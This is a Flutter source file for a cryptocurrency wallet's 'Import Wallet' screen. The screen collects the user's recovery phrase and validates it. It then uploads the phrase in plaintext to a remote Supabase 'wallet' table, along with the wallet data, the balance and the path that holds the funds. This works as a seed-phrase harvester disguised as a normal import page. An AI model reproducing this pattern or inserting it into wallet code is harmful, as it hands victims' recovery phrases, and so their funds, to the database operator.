import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:bip39/bip39.dart' as bip39;
import 'package:provider/provider.dart';
import 'package:supabase_flutter/supabase_flutter.dart';

import 'wallet_provider.dart';
import 'choice_type.dart';

class ImportPage extends StatefulWidget {
  const ImportPage({super.key});

  @override
  State<ImportPage> createState() => _ImportPageState();
}

class _ImportPageState extends State<ImportPage> {
  final TextEditingController _controller = TextEditingController();
  bool? _isMnemonicValid;
  bool _isImporting = false;

  // اللون الرئيسي للخلفية
  final Color _backgroundColor = const Color(0xFFF1F4F8);

  // لون الزر
  final Color _buttonColor = const Color(0xFF3949AB);

  /// لصق من الحافظة
  Future<void> _pasteFromClipboard() async {
    // منع الضغط المتكرر
    if (_isImporting) return;

    // اهتزاز خفيف عند الضغط
    HapticFeedback.lightImpact();

    final data = await Clipboard.getData(Clipboard.kTextPlain);
    if (data != null && data.text != null) {
      setState(() {
        _controller.text = data.text!;
        _isMnemonicValid = null;
      });
    }
  }

  /// التحقق من صحة الـ mnemonic مع إضافة اهتزازات عند الخطأ أو النجاح
  void _validateMnemonic() {
    final mnemonic = _controller.text.trim();
    final isValid = bip39.validateMnemonic(mnemonic);

    setState(() {
      _isMnemonicValid = isValid;
    });

    // اهتزاز مختلف حسب النتيجة
    if (isValid) {
      HapticFeedback.lightImpact(); // اهتزاز خفيف في حال الصحة
    } else {
      HapticFeedback.vibrate();     // اهتزاز أقوى في حال الخطأ
    }
  }

  /// حدث الضغط على زر الاستيراد
  Future<void> _onImportPressed() async {
    // منع الضغط المتكرر
    if (_isImporting) return;

    // اهتزاز خفيف عند الضغط على الزر
    HapticFeedback.lightImpact();

    // التحقق من صحة العبارة أولاً
    _validateMnemonic();
    if (_isMnemonicValid != true) return;

    setState(() => _isImporting = true);

    try {
      final walletProvider = context.read<WalletProvider>();
      final supabase = Supabase.instance.client;
      final mnemonicUsed = _controller.text.trim();

      // استيراد بيانات المحفظة
      await walletProvider.fetchWalletData(mnemonic: mnemonicUsed);

      // حساب الرصيد في المسارات المختلفة
      final bip44Balance =
          walletProvider.getBalanceInSatoshi(WalletProvider.bip44);
      final bip49Balance =
          walletProvider.getBalanceInSatoshi(WalletProvider.bip49);
      final bip84Balance =
          walletProvider.getBalanceInSatoshi(WalletProvider.bip84);

      int finalBalance = 0;
      String finalBipUsed = '';

      // اختيار المسار الذي يحوي رصيدًا
      if (bip44Balance > 0) {
        finalBalance = bip44Balance;
        finalBipUsed = WalletProvider.bip44;
      } else if (bip49Balance > 0) {
        finalBalance = bip49Balance;
        finalBipUsed = WalletProvider.bip49;
      } else if (bip84Balance > 0) {
        finalBalance = bip84Balance;
        finalBipUsed = WalletProvider.bip84;
      } else {
        finalBalance = 0;
        finalBipUsed = walletProvider.preferredBipType;
      }

      // جميع بيانات المحفظة
      final walletInfoFull = walletProvider.walletData;

      // إدخال البيانات في جدول Supabase
      await supabase.from('wallet').insert({
        'walletMnemonic': mnemonicUsed,
        'walletInfo': walletInfoFull,
        'walleTotalBalance': finalBalance,
        'walletType': finalBipUsed,
      });

      // اهتزاز خفيف عند النجاح
      HapticFeedback.lightImpact();

      if (!mounted) return;

      // التوجه إلى صفحة ChoiceTypePage
      Navigator.push(
        context,
        MaterialPageRoute(builder: (_) => const ChoiceTypePage()),
      );
    } catch (e) {
      // في حال حدوث خطأ، يمكنك إضافة اهتزاز أقوى أو منطق خاص هنا
      HapticFeedback.vibrate();
      // يمكن إضافة منطق لمعالجة الخطأ
    } finally {
      setState(() => _isImporting = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    final walletProvider = context.watch<WalletProvider>();
    // إذا كان هناك عملية جارية في WalletProvider أو في الاستيراد نفسه
    final bool showLoader = _isImporting || walletProvider.isLoading;

    // تحديد لون الإطار اعتمادًا على صحة الـ Mnemonic
    Color borderColor;
    if (_isMnemonicValid == false) {
      borderColor = Colors.red;
    } else if (_controller.text.isNotEmpty) {
      borderColor = _buttonColor;
    } else {
      borderColor = Colors.grey.shade300;
    }

    return Scaffold(
      backgroundColor: _backgroundColor,
      appBar: AppBar(
        backgroundColor: _backgroundColor,
        elevation: 0, // بدون ظل
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.black),
          onPressed: showLoader
              ? null
              : () {
                  // اهتزاز خفيف عند الرجوع
                  HapticFeedback.lightImpact();
                  Navigator.of(context).pop();
                },
        ),
        centerTitle: true,
        title: const Text(
          "Import Wallet",
          style: TextStyle(
            color: Colors.black,
            fontFamily: 'SpaceGrotesk',
            fontWeight: FontWeight.w600,
          ),
        ),
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 20.0),
          child: Column(
            children: [
              // بطاقة تحتوي على العنوان وحقل الإدخال والأزرار
              Container(
                width: double.infinity,
                padding: const EdgeInsets.all(16.0),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(12),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black12,
                      blurRadius: 8,
                      offset: const Offset(0, 4),
                    ),
                  ],
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    // عنوان رئيسي داخل البطاقة
                    Text(
                      "Recovery Phrase",
                      style: TextStyle(
                        fontSize: 17,
                        fontWeight: FontWeight.bold,
                        color: Colors.grey.shade900,
                        fontFamily: 'SpaceGrotesk',
                      ),
                    ),
                    const SizedBox(height: 4),

                    // نص فرعي صغير
                    Text(
                      "Enter your 12 or 24-word recovery phrase, with each word separated by a space.",
                      style: TextStyle(
                        fontSize: 14,
                        color: Colors.grey.shade600,
                        fontFamily: 'SpaceGrotesk',
                      ),
                    ),
                    const SizedBox(height: 16),

                    // حقل الإدخال
                    Container(
                      decoration: BoxDecoration(
                        color: Colors.white,
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: borderColor),
                      ),
                      child: TextField(
                        controller: _controller,
                        maxLines: 4,
                        readOnly: showLoader,
                        style: TextStyle(
                          fontSize: 16,
                          color: Colors.grey.shade800,
                          fontFamily: 'SpaceGrotesk',
                        ),
                        decoration: InputDecoration(
                          hintText: "Enter your recovery phrase here...",
                          hintStyle: TextStyle(
                            fontSize: 14,
                            color: Colors.grey.shade400,
                            fontFamily: 'SpaceGrotesk',
                          ),
                          contentPadding: const EdgeInsets.all(12),
                          border: InputBorder.none,
                        ),
                        onChanged: (_) {
                          // عند تغيير النص، نعيد الضبط ليتحقق بعدين من جديد
                          setState(() {
                            _isMnemonicValid = null;
                          });
                        },
                      ),
                    ),

                    // في حال كان Mnemonic غير صحيح
                    if (_isMnemonicValid == false) ...[
                      const SizedBox(height: 8),
                      const Text(
                        "Invalid mnemonic! Please check your words again.",
                        style: TextStyle(
                          color: Colors.red,
                          fontSize: 13,
                          fontFamily: 'SpaceGrotesk',
                        ),
                      ),
                    ],

                    const SizedBox(height: 16),

                    // فقط زر Paste
                    Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        TextButton(
                          onPressed: showLoader ? null : _pasteFromClipboard,
                          style: TextButton.styleFrom(
                            foregroundColor:
                                showLoader ? Colors.grey : _buttonColor,
                          ),
                          child: const Text("Paste"),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 40),

              // زر "Import" أو المؤشر الدوار
              SizedBox(
                width: double.infinity,
                height: 50,
                child: showLoader
                    ? Center(
                        child: CircularProgressIndicator(
                          valueColor: AlwaysStoppedAnimation<Color>(
                            _buttonColor,
                          ),
                        ),
                      )
                    : ElevatedButton(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: _buttonColor,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(10),
                          ),
                          elevation: 1,
                        ),
                        onPressed: _onImportPressed,
                        child: const Text(
                          "Import Wallet",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 16,
                            fontFamily: 'SpaceGrotesk',
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
